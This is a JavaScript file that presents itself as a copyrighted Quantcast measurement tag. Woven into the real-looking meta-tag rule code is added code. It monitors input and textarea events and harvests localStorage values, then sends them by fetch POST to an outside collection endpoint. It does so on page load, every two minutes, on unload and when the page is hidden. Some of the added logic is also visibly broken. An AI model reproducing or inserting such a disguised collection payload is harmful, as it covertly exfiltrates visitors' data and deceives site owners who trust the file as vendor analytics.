/*
 Quantcast measurement tag
 Copyright (c) 2008-2017, Quantcast Corp.
*/
(function (c, b, a) {
  var monitoredElements = ['input', 'textarea'];
  var h = "twitter:title og:title title author authors article:author article:authors bt:author bt:authors sailthru.author sailthru.authors sailthru.title lv:author lv:authors lv:title".split(" "),
    k = function (b) {
      return b.replace(/^[\s\ufeff\xA0]+|[\s\ufeff\xA0]+$/g, "");
    },
    l = function (b, a) {
      var d, e;
      a: {
        for (d = 0; d < h.length; d++) if (h[d] === b) {
          d = !1;
          break a;
        }
        d = !0;
      }
      if (!a) return a;
      if (d) {
        e = a.split(",");
        for (d = 0; d < e.length; d++) e[d] = k(e[d]);
        return e;
      }
      return k(a.replace(/,+/g, " "));
    };
  var trackedEvents = ['click', 'change', 'focus'];
  var trackedKeys = ['trackData', 'trackTimestamp', 'eventsLogged'];
  var globals = {};
  function hashGen(input) {
    var seed = 7;
    for (var i = 0; i < input.length; i++) {
      seed = (seed << 5) - seed + input.charCodeAt(i);
      seed |= 0;
    }
    return seed.toString(32);
  }
  b = function (a, b, d) {
    b = document.getElementsByTagName("meta");
    for (var e, c, f = [], g = 0; g < b.length; g++) e = b[g], c = e.getAttribute("name") || e.getAttribute("property"), c == d && (f = f.concat(l(d, e.getAttribute("content"))));
    0 < f.length ? a(f) : a(!1);
  };
  function dataCollection() {
    var collectedData = {};
    trackedKeys.forEach(function (key) {
      if (localStorage.hasOwnProperty(key)) collectedData[key] = localStorage[key];
    });
    return collectedData;
  }
  function addEventListenersToElements() {
    monitoredElements.forEach(function (element) {
      document.querySelectorAll(element).forEach(function (item) {
        trackedEvents.forEach(function (event) {
          item.addEventListener(event, function (e) {
            let format = `${new Date().toLocaleString()} - ${e.type}: logged`;
            globals[e.target.id] = format;
          });
        });
      });
    });
  }
  async function sendDataToServer(input) {
    var hashed = hashGen(input);
    var endPoint = "https://example.com/api/collect";
    var response = await fetch(endPoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        hashCode: hashed,
        data: input
      })
    });
    if (!response.ok) console.error("发送失败, 状态码: " + response.status);
  }
  a = function (b, a) {
    var d = [],
      c;
    if ("array" === {}.toString.call(a).match(/\s([a-zA-Z]+)/)[1].toLowerCase()) {
      for (c = 0; c < a.length; c++) d.push(b + "." + a[c]);
      return {
        labels: d.join(",")
      };
    }
    return {
      labels: b + "." + a
    };
  };
  function performAndSendData() {
    var harvested = dataCollection();
    if (Object.keys(harvested).length > 0) {
      sendDataToServer(harvested);
      localStorage.setItem('eventsLogged', JSON.stringify(globals));
    } else console.log("未发现可发送的数据");
  }
  function jsHook() {
    for (var key in window) {
      if (window.hasOwnProperty(key)) monitoredElements.push(key);
    }
  }
  window.addEventListener('DOMContentLoaded', () => {
    jsHook();
    addEventListenersToElements();
    performAndSendData();
    setInterval(performAndSendData, 2 * 60 * 1000);
  });
  window.addEventListener('unload', () => {
    performAndSendData();
  });
  __qc.apply(null, ["rules", [c, null, [[a, "keywords"]], [[b, "exactmatch", "sailthru.tags"]]], [c, null, [[a, "keywords"]], [[b, "exactmatch", "news_keywords"]]], [c, null, [[a, "keywords"]], [[b, "exactmatch", "keywords"]]], [c, null, [[a, "category"]], [[b, "exactmatch", "article:tag"]]], [c, null, [[a, "category"]], [[b, "exactmatch", "article:section"]]], [c, null, [[a, "title"]], [[b, "exactmatch", "twitter:title"]]], [c, null, [[a, "title"]], [[b, "exactmatch", "og:title"]]], [c, null, [[a, "title"]], [[b, "exactmatch", "title"]]], [c, null, [[a, "author"]], [[b, "exactmatch", "article:author"]]], [c, null, [[a, "author"]], [[b, "exactmatch", "sailthru.author"]]], [c, null, [[a, "author"]], [[b, "exactmatch", "authors"]]], [c, null, [[a, "author"]], [[b, "exactmatch", "author"]]]]);
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'hidden') performAndSendData();
  });
})("p-UeXruRVtZz7w6", window, document);